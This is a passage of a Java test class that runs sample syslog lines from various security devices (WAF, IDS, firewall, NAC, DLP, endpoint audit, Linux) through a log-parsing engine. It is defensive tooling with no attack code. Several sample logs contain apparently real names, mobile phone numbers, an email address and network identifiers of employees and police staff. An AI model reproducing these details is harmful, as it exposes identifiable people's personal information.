      parse(botuEngine, data);
      data = "Type=WEBTITLE; Source=59.209.88.14:11838; Dest=101.226.211.23:80; Username=59.209.88.14; Show Name=59.209.88.14; Group=Root/; Host=tools.3g.qq.com; URL=http://tools.3g.qq.com/wifi/cw.html; title=WiFi登录; Time=2018-11-30 18:11:51;";
      parse(botuEngine, data);
      data = "Type=Http Upload File; Source=59.203.180.210:27783; Dest=140.205.252.4:80; Username=59.203.180.210; Show Name=59.203.180.210; Group=Root/; Host=adashbc.m.taobao.com; URL=http://adashbc.m.taobao.com/rest/sur?ak=24845647&av=2.5.7&c=null&v=3.0&s=019049f4cdd007985a30539ff0a1f6b56a239fb5&d=WGmYAYtBViMDAIPnIWfFcjUn&sv=2.5.1.3_for_bc&p=a&t=1543572447742&u=&is=1&k=0; File Name=stm_bcx; Time=2018-11-30 18:11:40;";
      parse(botuEngine, data);
      data = "Type=Web Search Engine; Source=59.203.178.18:61313; Dest=36.110.147.124:80; Username=59.203.178.18; Show Name=59.203.178.18; Group=Root/; Host=; Search Content=0; Time=2018-11-30 18:12:27;";
      parse(botuEngine, data);
      data = "Type=Login; Source=59.209.88.14:11766; Dest=203.119.134.20:80; Username=59.209.88.14; Show Name=59.209.88.14; Group=Root/; ID=2; Account=百花台; Time=2018-11-30 18:11:38;";
      parse(botuEngine, data);
      data = "Type=SESSION; Mac=4c:b1:6c:1e:07:7e; Source=59.209.88.10:17895; Dest=115.239.210.27:443; Trans=0.0.0.0:0; Protocol=6; Service=754; Byte_sent=174; Byte_recve=66; Duration=120; Time=2018-11-30 18:11:07;";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testIpsJump() {
    String parserFile = "./resources/parsers/ips_jump_ids_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<185> 2020-08-25 11:06:03 SECURITY INSTRUCTION type dos系统攻击 id 497 name \"DDOS攻击，TCP协议Syn淹没攻击\" smac 58:69:6C:1A:32:E8 dmac 00:00:5E:00:03:64 prot TCP sip 10.33.3.5 sport 0 dip 218.77.92.135 dport 0 times 1";
      parse(botuEngine, data);
      data = "<167> 2020-08-25 11:06:00 ADMIN CONFIG user admin ip 10.33.1.18 module 日志设置-统一日志 cmd \"用户admin设置统一日志。\" result success";
      parse(botuEngine, data);
      data = "<185> 2011-06-09 10:25:23 jump IPS ADMIN LOGIN user liuyx ip 10.0.7.33 action login result success";
      parse(botuEngine, data);
      data = "<185> 2011-06-09 10:25:23 jump IPS SYSTEM MEMORY 98%";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testEpsVrv() {
    String parserFile = "./resources/parsers/eps_vrv_vrvedp_warn.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "AUD*|7*|上网访问*|2017-11-02 13:12:08*|192.168.0.111;172.20.8.106*|90B11C6C5BA0*|总BJ黄卫华JX4*|总*|黄卫华:Administrator*|BJ*|JX*|01066199737*|*|233*|木马网站访问监控*|审计上传网页:http://cv.duba.net/cv?uuid=6924c0f884c3c5a49f26af68b030889a&tc=19254281. 操作成功*|*|总行互联网二级服务器";
      parse(botuEngine, data);
      data = "AUD*|0*|并发连接数可疑*|2014-03-10 10:59:35*|192.168.141.250;192.168.5.253*|0C82684C106F;80000C807E70*|PC-201312181448*|中关村科技发展大厦C座*|贾燕霖:Administrator*|北京北信源软件股份有限公司*|售后部*|18611177918*|jiayanlin@vrvmail.com.cn*|4328*|边界检查策略*|发现使用多个网卡进行联网，MAC=0c-82-68-4c-10-6f IP=192.168.141.250;MAC=80-00-0c-80-7e-70 IP=192.168.5.253;";
      parse(botuEngine, data);
      data = "AUD*|7*|上网访问*|2017-11-02 13:12:10*|172.20.43.139*|4487FCD2F30F*|总BJ徐慧星CAM*|总*|徐慧星:Administrator*|BJ*|CAM*|01066199117*|*|1546*|木马网站访问监控*|审计上传网页:http://172.24.11.91/hello. 操作成功*|*|总行互联网二级服务器";
      parse(botuEngine, data);
      data = "WAR*|0*|病毒行为*|2014-11-04 08:17:55*|192.168.118.156*|ECA86B870D09*|XP-201311221503*|楚材警务室*|阮景如:Administrator*|武汉市公安局武昌区分局*|中华路派出所*|18986031768*|*|45634*|*|子网掩码由  改变为 255.255.255.0,";
      parse(botuEngine, data);
      data = "WAR*|0*|IP绑定变化*|2014-11-04 08:19:15*|192.168.118.156*|C89CDCB68D10*|南湖所水域天际*|建安街300号*|王诗柄:Administrator*|南湖所*|南湖所水域天际社区警务室*|18986091656*|*|72316*|*|子网掩码由  改变为 255.255.255.0,";
      parse(botuEngine, data);
      data = "STA*|2549*|1155*|15.74*|1367*|1363*|0*|0*|0*|13*|684*|39*|379*|0*|0*|869*|0";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testAdsNsfocus() {
    String parserFile = "./resources/parsers/antidos_nsfocus_ads_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<134> Login: admin|nsfocus|失败|218.249.91.195|2007-06-16 15:06:41";
      parse(botuEngine, data);
      data = "<172> Action: 2007-06-11 07:45:41|远程协助服务|启动远程协助服务|221.225.1.161|admin";
      parse(botuEngine, data);
      data = "<134> Collapsar load: 0.05% Mem: 27%. SN: COLL-4000-1009-001 Macid:F251-2CA6-5BCC-1DA8 Version:v4.5.20.081107";
      parse(botuEngine, data);
      data = "<129> Attack: SYN-Flood src=118.163.16.3 dst=58.56.32.83 sport=27943 dport=23 flag=SYN_INVALID";
      parse(botuEngine, data);
      data = "<12> LinkState: 2011-03-04 17:29:23 Link state of port E4 is detected from UP to DOWN";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testWafNsfocus() {
    String parserFile = "./resources/parsers/waf_nsfocus_waf-v6060_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<11>Jul 16 18:43:30 localhost waf: tag:waf_log_websec site_id:1526350602  protect_id:2526350633  dst_ip:10.16.0.14  dst_port:80  src_ip:10.16.5.251  src_port:8188  method:GET  domain:218.65.204.251  uri:/images/main%5f01.jpg  alertlevel:MEDIUM  event_type:HTTP_Protocol_Validation  stat_time:2018-07-16 18:43:29  policy_id:262145  rule_id:0  action:Accept  block:No  block_info:None  http:R0VUIC9pbWFnZXMvbWFpbl8wMS5qcGcgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS82MS4wLjMxNjMuMTAwIFNhZmFyaS81MzcuMzYNCkhvc3Q6IDIxOC42NS4yMDQuMjUxOjcwMDENCkNvbm5lY3Rpb246IEtlZXAtQWxpdmUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcA0KDQo=  alertinfo:QUJOT1JNQUxfUE9SVF9FWElTVA==  proxy_info:None  characters:Tm9uZQ==  count_num:1  protocol_type:HTTP  wci:Tm9uZQ==  wsi:Tm9uZQ==  country:Local area Network  correlation_id:0  site_name:鏅\uE1C0珮鎴愮哗璇佹槑绯荤粺  vsite_name:None";
      parse(botuEngine, data);
      data = "<11>Jul 16 18:43:20 localhost waf: tag:waf_log_webaccess site_id:1525984050  protect_id:2526034834  stat_time:2018-07-16 18:43:16  alertlevel:LOW  event_type:WEB Access Logs  dst_ip:10.16.1.15  dst_port:9000  url:/gxxk/resources/images/index/logo.jpg  src_ip:10.16.5.251  src_port:26549  method:GET  agent:Mozilla/5.0%20(Linux;%20Android%207.0;%20JMM%2dAL10%20Build/HONORJMM%2dAL10;%20wv)%20AppleWebKit/537.36%20(KHTML%2c%20like%20Gecko)%20Version/4.0%20Chrome/57.0.2987.132%20MQQBrowser/6.2%20TBS/044112%20Mobile%20Safari/537.36%20V1%5fAND%5fSQ%5f7.6.8%5f872%5fYYB  count_num:1  wa_host:117.141.112.20  wa_referer:http://117.141.112.20:9000/gxxk/  http_protocol:HTTP/1.1  protocol_type:HTTP  wci:Tm9uZQ==  wsi:Tm9uZQ==  country:Local area Network  action:Other  req_content_type:None  req_content_len:0  res_content_type:image/jpeg  res_content_len:3335  waf_status_code:0  ser_status_code:200  correlation_id:6578763735572405552";
      parse(botuEngine, data);
      data = "<14>Jul 16 18:43:10 localhost waf: tag:waf_log_wafstat stat_time:2018-07-16 18:42:00  cpu:1  mem:10";
      parse(botuEngine, data);
      data = "<14>Jul 16 18:43:05 localhost waf: tag:waf_log_system_run stat_time:2018-07-16 18:43:05  type:DEV_RESOURCE  source:monitor  info:Disk /opt/nsfocus usage 90% is over the alert mode threshold value 90%.";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testWafDbapp() {
    String parserFile = "./resources/parsers/waf_dbappsecurity_waf-2000gt_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<178>Nov 28 00:01:46 localhost DBAppWAF: 发生时间/2014-11-28 00:01:46,威胁/高,事件/文件限制,请求方法/GET,URL地址/www.bjfp.sh.cn/binjiang_default.aspx,POST数据/,服务器IP/219.233.64.9,主机名/www.bjfp.sh.cn,服务器端口/80,客户端IP/60.172.246.161,客户端端口/9113,客户端环境/Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0),标签/文件限制,动作/告警,HTTP/S响应码/200,攻击特征串/,触发规则/11060009,访问唯一编号/VHdK6n8AAAEAAY8yiZwAAAkI,国家/中国,省/安徽,市/淮北";
      parse(botuEngine, data);
      data = "<178>Nov 28 00:02:30 localhost DBAppWAF: 发生时间/2014-11-28 00:02:29,威胁/高,事件/文件限制,请求方法/GET,URL地址/www.bjfp.sh.cn/,POST数据/,服务器IP/219.233.64.9,主机名/www.bjfp.sh.cn,服务器端口/80,客户端IP/60.172.246.161,客户端端口/51245,客户端环境/Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0),标签/文件限制,动作/告警,HTTP/S响应码/302,攻击特征串/,触发规则/11060009,访问唯一编号/VHdLFX8AAAEAAZawdjcAABjB,国家/中国,省/安徽,市/淮北";
      parse(botuEngine, data);
      data = "<178>Jan  6 16:01:13 localhost DBAppWAF: 发生时间/2015-01-06 16:01:11,威胁/低,事件/协议违规,请求方法/GET,URL地址/219.233.64.9:80http://lhsr.sh.gov.cn,POST数据/,服务器IP/219.233.64.9,主机名/219.233.64.9:80,服务器端口/80,客户端IP/220.248.16.2,客户端端口/21207,客户端环境/check_http/v1991 (nagios-plugins 1.4.12),标签/协议违规,动作/告警,HTTP/S响应码/404,攻击特征串/,触发规则/11010001,访问唯一编号/VKuWR38AAAEAAJHU@hAAAABF,国家/中国,省/上海,市/NIL";
      parse(botuEngine, data);
      data = "<178>Jan  6 16:01:18 localhost DBAppWAF: 发生时间/2015-01-06 16:01:15,威胁/低,事件/协议违规,请求方法/GET,URL地址/www.shmzw.gov.cn:8080/gb/mzw/shzj/zjcs/index6.html,POST数据/,服务器IP/218.242.123.182,主机名/www.shmzw.gov.cn:8080,服务器端口/8080,客户端IP/106.120.173.108,客户端端口/59736,客户端环境/Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07),标签/协议违规,动作/告警,HTTP/S响应码/400,攻击特征串/,触发规则/11010012,访问唯一编号/VKuWS38AAAEAAJK3KgsAAAJH,国家/中国,省/广东,市/NIL";
      parse(botuEngine, data);
      data = "<178>Feb 24 14:04:35 192.168.22.13 DBAppWAF: happentime/2021-02-24 14:04:33,severity_id/2,msg_id/14050,method/GET,url/10.255.49.64:8090/hnEpg/epg/common!goToIndexPage.action?groupId=045f4b637f00000105a0b1ca479a8d39&epg_info=%3Cserver_ip%3Ehttp://10.255.57.164:8080/iptvepg%3C/server_ip%3E%3Cgroup_name%3E78%3C/group_name%3E%3Cgroup_path%3E/iptvepg/frame79%3C/group_path%3E%3Coss_user_id%3E1164558504%3C/oss_user_id%3E%3Cpage_url%3Ehttp://10.255.57.164:8080/iptvepg/frame79/portal.jsp%3C/page_url%3E%3Cpartner%3EZTE2X%3C/partner%3E%3Carea%3E089801%3C/area%3E%3CproductId%3E16220162%3C/productId%3E&UserID=1164558504&iptv_flag=zx&backUrl=http%3A%2F%2F10.255.57.164%3A8080%2Fiptvepg%2Fframe79%2FHN_Hotel%2Fportal.jsp%3FbackPage%3DMod_16.html%26backFlag%3D1%26navOffse%3D0,post/,dip/192.168.82.30,hostname/10.255.49.64:8090,dport/8090,sip/10.252.69.27,sport/62428,user_agent/webkit;Resolution(PAL,720P,1080P);Ranger:width=1920&height=1080,tag_id/1405,action_id/2,response_code/302,m...";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testIdsNsfocus() {
    String parserFile = "./resources/parsers/ids_nsfocus_nids[5.6r10f02sp6]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<5>time=2019-10-12 18:10:39;device_type=ips;manufacturers=nsfocus;product=FFFFFFFF-FFFF1234;log_type=av;danger_degree=2;pkt_len=0;breaking_sighn=0;event=[40819]网络数据中发现病毒文件:Trojan.GenericKD.2148729;last_count=1;src_mac=02-1A-C5-01-00-00;src_addr=1.1.86.147;src_port=20395;dst_mac=02-1A-C5-02-00-00;dst_addr=1.2.151.48;dst_port=25;user=null;smt_user=null;proto=SMTP;attack=64;os=67108864;service=32505856;pop=8;";
      parse(botuEngine, data);
      data = "<5>time=2020-06-03 21:21:28;log_type=ips;danger_degree=1;breaking_sighn=0;event=[50002]TFTP服务客户端企图获取服务器根目录文件;src_addr=10.100.110.7;src_port=34534;dst_addr=192.168.124.245;dst_port=69;user=null;smt_user=null;proto=TFTP;";
      parse(botuEngine, data);
      data = "<5>manufacturers=nsfocus;device_type=ids;user=admin;loginip=10.14.62.120;time=2019-05-20 15:31:04;log_type=2;msg=编辑应用控制策略，编号[1]。";
      parse(botuEngine, data);
      data = "<5>manufacturers=nsfocus;device_type=ids;log_type=fw_log;rule_id=1;time=2019-05-20 15:38:25;module=fw;src_intf=G1/1;dst_intf=null;action=accept;proto=udp;src_addr=10.14.62.120;src_port=50177;dst_addr=192.168.1.4;dst_port=53;src_addr_nat=null;src_port_nat=null;dst_addr_nat=null;dst_port_nat=null;info=null;user=null;app_name=DNS 协议;";
      parse(botuEngine, data);
      data = "<5>time:2010-08-13 15:35:18;danger_degree:3;breaking_sighn:0;event:[20132]Microsoft IIS 4.0/5.0 Unicode;src_addr:192.168.7.10;src_port:2983;dst_addr:192.168.7.166;dst_port:80;proto:TCP.HTTP";
      parse(botuEngine, data);
      data = "<5>time:2010-08-13 15:33:39;danger_degree:3;breaking_sighn:0;event:[10044]Microsoft FrontPage shtml.exe;src_addr:192.168.11.120;src_port:42922;dst_addr:192.168.1.11;dst_port:80;proto:TCP.HTTP";
      parse(botuEngine, data);
      data = "<255>user:null;loginip:10.99.108.14;time:1343007071;type:3;";
      parse(botuEngine, data);
      data = "<5>time:2013-04-17 14:53:09;danger_degree:1;breaking_sighn:0;event:[50049]TELNET服务用户认证;src_addr:172.21.16.21;src_port:58456;dst_addr:172.20.6.70;dst_port:23;proto:TCP.TELNET";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testIdsNsfocus11f() {
    String parserFile = "./resources/parsers/ids_nsfocus_nids[5.6r11f]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "device_type=ips;manufacturers=nsfocus;security_name=ips_log;time=1642400984;card=T2/1;sip=10.14.69.177;smac=00:0C:29:32:E9:4A;sport=32656;dip=10.14.14.189;dmac=00:1B:21:0B:ED:CA;dport=21;vid=0;ruleid=40041;event=FTP服务客户端使用空口令登录;module=0;threat_level=2;threat_type=044 配置不当;attack_type=1;action=1;acted=1;count=1;protocol=TCP;user_name=;smt_user=;policy_id=1;digest=RlRQblNmMEN1c0NMSUVOVA==;direction=client;szonename=Monitor;dzonename=;rawinfo=ABshC+3KAAwpMulKCABFAAAvJgtAAIAGAAAKDkWxCg4OvX+QABWGuNkCYkdeVlAYQBpoqwAAUEFTUyANCg==;rawlen=84;cdnip=;extension=;popular=2;affect_os=Windows,Linux/Unix;service=FTP;ar=2;cve_id=;cwe_id=;cnnvd_id=;src_asset=0;dst_asset=0;scountry=;scity=;dcountry=;dcity=";
      parse(botuEngine, data);
      data = "<190> device_type=ips;manufacturers=nsfocus;hash=FC62-CECE-5D66-4F0F;time=2023-07-04 16:29:18;module=system;type=1;level=3;msg=warning!!! free system space is lower than 10 percent";
      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=ips_log;time=1642400984;card=T2/1;sip=10.14.69.177;smac=00:0C:29:32:E9:4A;sport=32656;dip=10.14.14.189;dmac=00:1B:21:0B:ED:CA;dport=21;vid=0;ruleid=40041;event=FTP服务客户端使用空口令登录;module=0;threat_level=2;threat_type=044 配置不当;attack_type=1;action=1;acted=1;count=1;protocol=TCP;user_name=;smt_user=;policy_id=1;digest=RlRQblNmMEN1c0NMSUVOVA==;direction=client;szonename=Monitor;dzonename=;rawinfo=ABshC+3KAAwpMulKCABFAAAvJgtAAIAGAAAKDkWxCg4OvX+QABWGuNkCYkdeVlAYQBpoqwAAUEFTUyANCg==;rawlen=84;cdnip=;extension=;popular=2;affect_os=Windows,Linux/Unix;service=FTP;ar=2;cve_id=;cwe_id=;cnnvd_id=;src_asset=0;dst_asset=0;scountry=;scity=;dcountry=;dcity=";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testOsLinux() {
    String parserFile = "./resources/parsers/os_linux_linux_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<86>May 14 17:09:11 baode sshd[30888]: Did not receive identification string from 172.18.6.36";
      parse(botuEngine, data);
      data = "<30>Sep 13 13:01:01 bak-server-120 systemd: Started Session 2567 of user root.";
      parse(botuEngine, data);
      data = "<86>Sep 13 11:06:27 bak-server-120 sshd[21889]: Accepted password for root from 192.168.20.1 port 15043 ssh2";
      parse(botuEngine, data);
      data = "<77>Sep 12 03:38:01 localhost anacron[19690]: Job `cron.daily' started";
      parse(botuEngine, data);
      data = "<77>Sep 11 00:01:01 localhost run-parts(/etc/cron.hourly)[1792 starting 0anacron";
      parse(botuEngine, data);
      data = "<86>Sep 10 19:51:51 localhost sshd[17305]: pam_unix(sshd:session): session closed for user root";
      parse(botuEngine, data);
      data = "<86>Sep 10 17:39:45 localhost sshd[17390]: Accepted publickey for root from 192.168.40.120 port 39608 ssh2: RSA SHA256:DO9WPPquhZslTPBOvYQYRBd7NGzLH5+QtE7wEy3JQpc";
      parse(botuEngine, data);
      data = "<78>Sep 10 15:37:53 localhost crontab[16954]: (root) LIST (root)";
      parse(botuEngine, data);
      data = "<134>Sep 13 15:19:07 localhost 111_nginx_access 192.168.40.5 - - [13/Sep/2021:15:19:01 +0800] \"GET / HTTP/1.1\" 400 255 \"-\" \"curl/7.64.0\" \"-\"";
      parse(botuEngine, data);
      data = "<invld>Sep 15 15:00:01 localhost 111_nginx_error 2021/09/15 14:59:53 [warn] 13576#0: *824874 an upstream response is buffered to a temporary file /usr/local/nginx/proxy_temp/7/63/0000007637 while reading upstream, client: 192.168.40.35, server: www.nvdb.org.cn, request: \"GET /user/img/index_bg.0bd3d02d.png HTTP/1.1\", upstream: \"http://192.168.40.111:8894/img/index_bg.0bd3d02d.png\", host: \"nvdb.org.cn\", referrer: \"https://nvdb.org.cn/user/css/chunk-1b6ac0cc.e4aae245.css\"";
      parse(botuEngine, data);
      data = "<86>Sep 11 14:27:23 OA-APP-TEST sshd[36846]: Accepted password for root from 172.26.150.168 port 34376 ssh2";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  // 画方准入
  public void testNACHuafang() {
    String parserFile = "./resources/parsers/nac_huafoun_nam[10.5]_warn.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<134>2019-10-24 14:10:26 NAM2000190519001: event=设备接入网络（上线） eventid=67108864 term=192.168.0.120-10(20:47:47:84:20:E8/192.168.0.120) user=- ou=- vlan=default-vlan nas=H3C_S5500/GigabitEthernet1/0/14 msg=设备管理";
      parse(botuEngine, data);
      data = "<134>2019-10-24 14:10:26 NAM2000190519001: event=设备首次接入网络需要注册 eventid=33554433 term=192.168.0.120-10(20:47:47:84:20:E8/192.168.0.120) user=- ou=- vlan=default-vlan nas=H3C_S5500/GigabitEthernet1/0/14 msg=设备管理";
      parse(botuEngine, data);
      data = "<134>2019-10-24 14:10:55 NAM2000190519001: event=发现新设备首次接入网络 eventid=33554432 term=00:50:56:B8:34:53(00:50:56:B8:34:53/192.168.1.201) user=- ou=- vlan=default-vlan nas=-/- msg=[数据监听]创建，基于[IP默认规则]将其自动划分到[未知]部门";
      parse(botuEngine, data);
      data = "<134>2019-10-24 14:10:56 NAM2000190519001: event=设备在线探测技术发生变化 eventid=67108870 term=HONOR_V20-yuio(88:BF:E4:FC:41:F0/192.168.4.31) user=于佳乐 ou=研发 vlan=vlan4 nas=192.168.1.254/FastEthernet0/2 msg=由（数据监听+设备管理+IP分配）变为（设备管理+IP分配）";
      parse(botuEngine, data);
      data = "<134>2019-10-24 14:10:56 NAM2000190519001: event=终端自动重命名 eventid=33554443 term=00:50:56:B8:34:53(00:50:56:B8:34:53/192.168.1.201) user=- ou=- vlan=default-vlan nas=-/- msg=根据（网卡厂商）规则将终端（00:50:56:B8:34:53）命名为（VMware- Inc.-B8:34:53）";
      parse(botuEngine, data);
      data = "<134>2019-10-24 14:10:56 NAM2000190519001: event=设备接入网络（上线） eventid=67108864 term=00:50:56:B8:34:53(00:50:56:B8:34:53/192.168.1.201) user=- ou=- vlan=default-vlan nas=-/- msg=数据监听";
      parse(botuEngine, data);
      data = "<134>2019-10-24 14:11:06 NAM2000190519001: event=自动识别为虚拟机 eventid=33554445 term=VMware-_Inc.-B8:34:53(00:50:56:B8:34:53/192.168.1.201) user=- ou=- vlan=default-vlan nas=-/- msg=-";
      parse(botuEngine, data);
      data = "<134>2019-10-24 14:11:06 NAM2000190519001: event=终端自动重命名 eventid=33554443 term=VMware-_Inc.-B8:34:53(00:50:56:B8:34:53/192.168.1.201) user=- ou=- vlan=default-vlan nas=-/- msg=根据（IP地址）规则将终端（VMware-_Inc.-B8:34:53）命名为（192.168.1.201）";
      parse(botuEngine, data);
      data = "<134>2019-10-24 14:11:16 NAM2000190519001: event=自动识别设备操作系统 eventid=33554438 term=192.168.1.201-1(00:50:56:B8:34:53/192.168.1.201) user=- ou=- vlan=sensor nas=-/- msg=根据（终端指纹）信息自动识别操作系统为Windows（Windows_7）";
      parse(botuEngine, data);
      data = "<134>2019-10-24 14:11:26 NAM2000190519001: event=设备IP地址发生变化 eventid=50331652 term=徐鲁兵-虚拟机(1.11)(00:0C:29:7C:8F:92/192.168.1.11) user=徐鲁兵 ou=- vlan=default-vlan nas=192.168.1.10/GigabitEthernet0/12 msg=由（192.168.1.222）变为（192.168.1.11）";
      parse(botuEngine, data);
      data = "<134>2019-10-24 14:11:26 NAM2000190519001: event=设备在线探测技术发生变化 eventid=67108870 term=192.168.1.201-1(00:50:56:B8:34:53/192.168.1.201) user=- ou=- vlan=default-vlan nas=-/- msg=由（数据监听）变为（数据监听+设备管理）";
      parse(botuEngine, data);
      data = "<134>2019-10-24 14:11:37 NAM2000190519001: event=设备在线探测技术发生变化 eventid=67108870 term=苏健-手机(30:94:35:BA:1E:DF/192.168.4.211) user=苏健 ou=- vlan=vlan4 nas=192.168.1.254/FastEthernet0/2 msg=由（数据监听+设备管理+IP分配）变为（设备管理+IP分配）";
      parse(botuEngine, data);
      data = "<134>2019-10-24 14:11:50 NAM2000190519001: event=用户账号认证失败 eventid=16777217 term=李京飞-笔记本(8C:16:45:F8:F7:3E/192.168.1.12) user=liuchao ou=研发 vlan=default-vlan nas=self_service/GigabitEthernet0/0/7 msg=密码检查失败！";
      parse(botuEngine, data);
      data = "<173>Dec 13 04:28:40 NAM0020000000001: admin=secadmin optip=192.168.1.123 act=1 result=1 msg=[终端信息【名称[192.168.0.120-3  abc]】]";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testDlpTopsec() {
    String parserFile = "./resources/parsers/dlp_topsec_dlp[3.2294]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "##TIME=2020-07-14 10:22:31##PROCESS=IncidentSvr-Per[19467]##BLOCKED=DISABLE##BLOCKEDSTATUS=UNSUCCESS##DATAOWNER_NAME=##DATAOWNER_EMAIL=##ENDPOINT_DEVICE_ID=##ENDPOINT_MACHINE=##FileCount=0##PARENT_PATH=##INCIDENT_ID=37636##INCIDENT_TIME=1594693341000##INCIDENT_SNAPSHOT=##IncidentMatchCount=3##PolicyMatchCount=2##PolicyName=狗子-syslog;你好啊##RuleMatchCount=2##RuleName=关键字狗子;你好啊##PROTOCOL=HTTP##method=resquest##QUARANTINE_PARENT_PATH=$QUARANTINE_PARENT_PATH$##RECIPIENTS=##RECIPIENTSADDR=172.168.81.43##RECIPIENTSPORT=80##RECIPIENTSDOMAIN=http://172.168.81.43/lib/testcases/tcEdit.php##SCAN=##SENDER=##SENDERIP=172.168.80.2##SENDERPORT=62917##Serverty=high##SUBJECT=##TARGET=";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testFWTopsec() {
    String parserFile = "./resources/parsers/firewall_topsec_ngfw4000[3.2294.26036_ngfw.1_b_upt]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-12 14:26:12\" dev=\"TopsecOS\" pri=\"6\" type=\"vpn\" recorder=\"ipsec\" index=\"2300\" vsid=\"0\" vsys_name=\"root_vsys\" tunnel_name=\"test\" ike_moudle=\"quick mode\" sa_savelive=\"28800\" num_of_consultations=\"3\" msg=\"The second stage was successful\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2294.26021_NGFW.1_R\" time=\"2020-03-23 10:11:34\" dev=\"TopsecOS\" pri=\"6\" type=\"ac\" recorder=\"ac\" vsid=\"0\" vsys_name=\"root_vsys\"    policyid=\"8040\" policyname=\"ceshi\" protoname=\"ICMP\" src=\"192.168.105.89\" sport=\"2478\" dst=\"192.168.10.20\" dport=\"8\" action=\"允许\" appname=\"unknown\" user=\"unknown\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2294.26021_NGFW.1_R\" time=\"2020-03-23 15:13:23\" dev=\"TopsecOS\" pri=\"6\" type=\"ids\" recorder=\"ids\" vsid=\"0\" vsys_name=\"root_vsys\" idsip=\"6.6.6.125\" src=\"192.168.2.10\" dst=\"192.168.199.223\" msg=\"IDS设备信息上报成功\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2294.26021_NGFW.1_R\" time=\"2019-01-02 10:23:06\" dev=\"TopsecOS\" pri=\"4\" type=\"streamav\" recorder=\"streamav\" vsid=\"0\" vsys_name=\"root_vsys\" protoname=\"smtp\" user=\"10.10.10.100\" src=\"10.10.10.100\" dst=\"192.168.105.211\" sport=\"49438\" dport=\"25\" fw_name=\"fw106155713\"  url=\"null\" sender=\"test2@test.com\" receiver=\"test1@test.com\" cc=\"null\" subject=\"1qw\" command=\"null\" filename=\"95e6d984f29113ed160627d2f334fe066b077a56\" virus_name=\"Trojan.Win32.Llac.bdm\" action=\"block\"";
      parse(botuEngine, data);
